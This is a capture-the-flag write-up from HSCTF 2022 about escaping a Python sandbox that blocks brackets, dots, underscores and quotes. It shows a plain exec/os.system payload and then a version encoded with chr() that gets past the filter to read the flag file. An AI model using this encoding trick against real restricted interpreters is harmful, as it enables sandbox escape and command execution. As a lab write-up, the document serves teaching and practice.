---
title: "[HSCTF] pass"
excerpt_separator: <!--more-->
categories:
  - CTF
tags:
  - HSCTF
  - MISC
  - "2022"
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

This is a python sandbox challenge.

By inputting some characters, we can identify few `Illegal characters`:
```
[]._'"
```

<!--more-->

But luckily `()` is allowed, looking at `locals()`, we can see `exec()` is allowed.

![IMG](/assets/images/hsctf2022-paas/img.png)

`exec()` required string argument but unfortunately `'"` were restricted. However, we found out that `chr()` is allowed, so let's create our payload:

Original payload:
```py
exec("__import__('os').system('cat flag')")
```
Payload crafted to bypass restrictions:
```py
exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))
```

Execute it and got the flag!

![IMG](/assets/images/hsctf2022-paas/img2.png)

Flag:
```
flag{vuln3r4b1l17y_45_4_53rv1c3}
```